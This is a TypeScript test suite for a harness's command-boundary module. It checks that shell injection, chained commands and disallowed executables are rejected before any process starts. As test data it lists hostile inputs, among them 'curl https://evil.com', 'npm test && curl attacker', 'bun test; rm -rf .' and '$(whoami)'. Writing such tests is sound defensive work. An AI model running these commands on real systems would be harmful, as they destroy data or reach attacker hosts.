/**
 * Production Command Boundary Integration Tests
 *
 * These tests prove that:
 * 1. Both production execution paths (requirement-runner.ts and validation-executor.ts)
 *    use the canonical structured command boundary.
 * 2. No requirement-controlled string reaches execSync, exec, or a shell.
 * 3. The legacy adapter is fail-closed for all unsafe inputs.
 * 4. The structured contract enforces all security properties end-to-end.
 * 5. Pre-spawn rejection: rejected requirements spawn 0 child processes.
 * 6. Static regression: blocks aliased process imports and execution.
 */
import { describe, it, expect, spyOn } from "bun:test"
import { readFileSync } from "fs"
import { join } from "path"
import * as cp from "child_process"

// ─── Production module imports ────────────────────────────────────────────────
import { runRequirements } from "../../src/better-harness/verification/requirement-runner"
import { executeValidation } from "../../src/better-harness/opencode/validation-executor"
import * as boundary from "../../src/services/command-boundary"

const {
  executeValidatedCommand,
  executeValidatedCommandSync,
  parseLegacyRequirementString,
} = boundary

type ValidationRequirement = boundary.ValidationRequirement

const ROOT = join(import.meta.dir, "../..")

/**
 * AST / Regex source code analyzer for process API leaks.
 * Detects ESM imports, CommonJS requires, direct calls, aliased calls, and shell: true.
 */
function analyzeSourceForForbiddenProcessAPIs(src: string): string[] {
  const violations: string[] = []

  // Direct ESM import from child_process or node:child_process
  if (/import\s+[\s\S]*?from\s+["'](?:node:)?child_process["']/.test(src)) {
    violations.push("Direct ESM import from child_process")
  }
  // Direct CommonJS require of child_process or node:child_process
  if (/require\s*\(\s*["'](?:node:)?child_process["']\s*\)/.test(src)) {
    violations.push("Direct CommonJS require of child_process")
  }
  // Any execution calls (execSync, exec, spawn, spawnSync, execFile, execFileSync)
  if (/(?:^|[^\w.])(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(/.test(src)) {
    violations.push("Forbidden child process execution call")
  }
  // Usage of shell: true
  if (/shell\s*:\s*true/.test(src)) {
    violations.push("Forbidden shell: true usage")
  }

  return violations
}

// ─── Static Regression: No process APIs in production executors ──────────────
describe("Static Regression — no child_process APIs in production executors", () => {
  const PRODUCTION_FILES = [
    "src/better-harness/verification/requirement-runner.ts",
    "src/better-harness/opencode/validation-executor.ts",
  ]

  for (const relPath of PRODUCTION_FILES) {
    it(`${relPath} must not import child_process or use execution calls`, () => {
      const src = readFileSync(join(ROOT, relPath), "utf-8")
      // Filter out pure comment lines before checking execution calls
      const codeOnly = src.replace(/\/\*[\s\S]*?\*\/|\/\/.*/g, "")
      const violations = analyzeSourceForForbiddenProcessAPIs(codeOnly)
      expect(violations).toEqual([])
    })

    it(`${relPath} must import from command-boundary`, () => {
      const src = readFileSync(join(ROOT, relPath), "utf-8")
      expect(src).toContain("command-boundary")
    })
  }

  it("Source analyzer correctly detects aliased imports and require patterns", () => {
    const SAMPLE_VIOLATIONS = [
      'import { execSync as execute } from "node:child_process"',
      'import childProcess from "node:child_process"',
      'import * as cp from "child_process"',
      'const { execSync: execute } = require("node:child_process")',
      'const cp = require("child_process")',
      'execSync("ls")',
      'spawn("node", ["app.js"], { shell: true })',
    ]

    for (const sample of SAMPLE_VIOLATIONS) {
      const violations = analyzeSourceForForbiddenProcessAPIs(sample)
      expect(violations.length).toBeGreaterThan(0)
    }
  })
})

// ─── Pre-Spawn Rejection Proof ────────────────────────────────────────────────
describe("Pre-Spawn Rejection Proof — 0 child processes spawned for rejected commands", () => {
  const REJECTED_REQUIREMENTS: Array<ValidationRequirement | string> = [
    { executable: "git", args: ["push"] },
    { executable: "git", args: ["branch", "new-branch"] },
    { executable: "git", args: ["tag", "release-name"] },
    { executable: "npm", args: ["install"] },
    { executable: "npm", args: ["publish"] },
    { executable: "npm", args: ["exec", "package"] },
    { executable: "bun", args: ["add", "package"] },
    { executable: "bun", args: ["run", "arbitrary.ts"] },
    { executable: "node", args: ["script.js"] },
    { executable: "node", args: ["-e", "process.exit()"] },
    "git branch new-branch",
    "git tag v1.0",
    "npm install",
    "npm publish",
    "bun add express",
    "node script.js",
    "sh -c 'npm test'",
    "cmd.exe /c dir",
  ]

  it("runRequirements spawns ZERO processes for all rejected requirements", () => {
    const spy = spyOn(cp, "execFileSync")
    const initialCalls = spy.mock.calls.length

    for (const req of REJECTED_REQUIREMENTS) {
      const results = runRequirements([req], process.cwd())
      expect(results).toHaveLength(1)
      expect(results[0].passed).toBe(false)
    }

    const callsCount = spy.mock.calls.length - initialCalls
    expect(callsCount).toBe(0)
    spy.mockRestore()
  })

  it("executeValidation spawns ZERO processes for all rejected requirements", () => {
    const spy = spyOn(cp, "execFileSync")
    const initialCalls = spy.mock.calls.length

    for (const req of REJECTED_REQUIREMENTS) {
      const cmdStr = typeof req === "string" ? req : `${req.executable} ${req.args.join(" ")}`
      const result = executeValidation(cmdStr, process.cwd(), 5000)
      expect(result.passed).toBe(false)
      expect(result.exitCode).toBeNull()
    }

    const callsCount = spy.mock.calls.length - initialCalls
    expect(callsCount).toBe(0)
    spy.mockRestore()
  })
})

// ─── Structured ValidationRequirement: success cases ─────────────────────────
describe("Production path — structured requirement success cases", () => {
  it("npm --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "npm", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toMatch(/\d+\.\d+/)
  })

  it("bun --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "bun", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toMatch(/\d+/)
  })

  it("node --version succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "node", args: ["--version"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].passed).toBe(true)
    expect(results[0].output).toContain("v")
  })

  it("git status --short succeeds through runRequirements", () => {
    const results = runRequirements(
      [{ executable: "git", args: ["status", "--short"] } satisfies ValidationRequirement],
      process.cwd()
    )
    expect(results).toHaveLength(1)
    expect(results[0].exitCode).toBe(0)
  })

  it("node --version succeeds through executeValidation with legacy string", () => {
    const result = executeValidation("node --version", process.cwd(), 5000)
    expect(result.passed).toBe(true)
    expect(result.exitCode).toBe(0)
    expect(result.stdout).toContain("v")
    expect(result.error).toBeNull()
  })
})

// ─── Pipe injection rejected through executeValidation ────────────────────────
describe("Production path — injection rejection through executeValidation", () => {
  it("pipe payload is rejected before process creation", () => {
    const result = executeValidation("npm test | tee output", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("semicolon chaining is rejected before process creation", () => {
    const result = executeValidation("bun test; rm -rf .", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("redirect is rejected before process creation", () => {
    const result = executeValidation("git status > /tmp/out", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("backtick substitution is rejected before process creation", () => {
    const result = executeValidation("npm `whoami`", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("command substitution $() is rejected before process creation", () => {
    const result = executeValidation("npm $(id)", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("Windows cmd.exe is rejected", () => {
    const result = executeValidation("cmd.exe /c npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("powershell is rejected", () => {
    const result = executeValidation("powershell -Command npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("sh -c is rejected", () => {
    const result = executeValidation('sh -c "npm test"', process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("environment assignment is rejected", () => {
    const result = executeValidation("FOO=bar npm test", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toContain("Command rejected")
  })

  it("empty string is rejected", () => {
    const result = executeValidation("", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })

  it("absolute Windows path is rejected", () => {
    const result = executeValidation("C:\\Windows\\system32\\cmd.exe /c dir", process.cwd(), 5000)
    expect(result.passed).toBe(false)
    expect(result.error).toBeTruthy()
  })
})

// ─── parseLegacyRequirementString approved examples ──────────────────────────
describe("parseLegacyRequirementString — approved inputs", () => {
  const APPROVED: Array<{ input: string; executable: string; args: string[] }> = [
    { input: "npm test", executable: "npm", args: ["test"] },
    { input: "npm run typecheck", executable: "npm", args: ["run", "typecheck"] },
    { input: "bun test tests/example.test.ts", executable: "bun", args: ["test", "tests/example.test.ts"] },
    { input: "git status --short", executable: "git", args: ["status", "--short"] },
    { input: "git diff --stat", executable: "git", args: ["diff", "--stat"] },
    { input: "tsc --noEmit", executable: "tsc", args: ["--noEmit"] },
    { input: "oxlint --deny-warnings", executable: "oxlint", args: ["--deny-warnings"] },
    { input: "node --version", executable: "node", args: ["--version"] },
  ]

  for (const { input, executable, args } of APPROVED) {
    it(`parses "${input}" correctly`, () => {
      const req = parseLegacyRequirementString(input)
      expect(req.executable as string).toBe(executable)
      expect(req.args).toEqual(args)
    })
  }
})

// ─── parseLegacyRequirementString rejected examples ──────────────────────────
describe("parseLegacyRequirementString — rejected inputs", () => {
  const REJECTED = [
    "npm test && curl attacker",
    "npm test | tee output",
    "git status > output.txt",
    "bun test; rm -rf .",
    "$(whoami)",
    "`whoami`",
    "FOO=bar npm test",
    'sh -c "npm test"',
    "cmd.exe /c npm test",
    "powershell -Command npm test",
    "",
    'npm test "with quotes"',
    "../scripts/something.sh",
    "/usr/bin/npm test",
    "curl https://evil.com",
    "wget http://evil.com",
    "bash -c id",
    "python3 -c 'import os'",
    "git branch new-branch",
    "git tag v1.0",
    "npm install",
    "npm publish",
    "bun add express",
    "node script.js",
  ]

  for (const input of REJECTED) {
    it(`rejects "${input.slice(0, 50)}"`, () => {
      expect(() => parseLegacyRequirementString(input)).toThrow()
    })
  }
})

// ─── Timeout and output bounds ────────────────────────────────────────────────
describe("Production path — timeout and output bounds", () => {
  it("executeValidatedCommandSync enforces timeout bounds", () => {
    const result = executeValidatedCommandSync(
      { executable: "node", args: ["--version"], timeoutMs: 10_000 },
      process.cwd()
    )
    expect(result.exitCode).toBe(0)
  })

  it("executeValidatedCommand (async) enforces timeout bounds", async () => {
    const result = await executeValidatedCommand(
      { executable: "node", args: ["--version"], timeoutMs: 10_000 },
      process.cwd()
    )
    expect(result.exitCode).toBe(0)
  })

  it("executeValidatedCommandSync rejects invalid resource bounds before execution", () => {
    expect(() =>
      executeValidatedCommandSync(
        { executable: "node", args: ["--version"], timeoutMs: 0 },
        process.cwd()
      )
    ).toThrow(/Invalid timeoutMs/)

    expect(() =>
      executeValidatedCommandSync(
        { executable: "node", args: ["--version"], maxBuffer: 100 },
        process.cwd()
      )
    ).toThrow(/Invalid maxBuffer/)
  })
})

// ─── Result ordering and isolation ───────────────────────────────────────────
describe("Production path — result ordering and isolation", () => {
  it("one failing requirement does not suppress later results", () => {
    const results = runRequirements(
      [
        { executable: "git", args: ["push"] } as ValidationRequirement,
        { executable: "node", args: ["--version"] },
        { executable: "node", args: ["-v"] },
      ],
      process.cwd()
    )
    expect(results).toHaveLength(3)
    expect(results[0].passed).toBe(false)
    expect(results[1].passed).toBe(true)
    expect(results[2].passed).toBe(true)
  })

  it("result order matches input order", () => {
    const reqs: ValidationRequirement[] = [
      { executable: "node", args: ["--version"] },
      { executable: "bun", args: ["--version"] },
      { executable: "npm", args: ["--version"] },
    ]
    const results = runRequirements(reqs, process.cwd())
    expect(results).toHaveLength(3)
    for (let i = 0; i < 3; i++) {
      expect(results[i].passed).toBe(true)
    }
  })

  it("non-zero process exit is returned accurately", () => {
    // git diff on invalid commit hash passes validation (2 rev args) but git exits non-zero
    const results = runRequirements(
      [{ executable: "git", args: ["diff", "0000000000000000000000000000000000000000", "1111111111111111111111111111111111111111"] }],
      process.cwd()
    )
    expect(results[0].passed).toBe(false)
    expect(results[0].exitCode).not.toBe(0)
  })
})
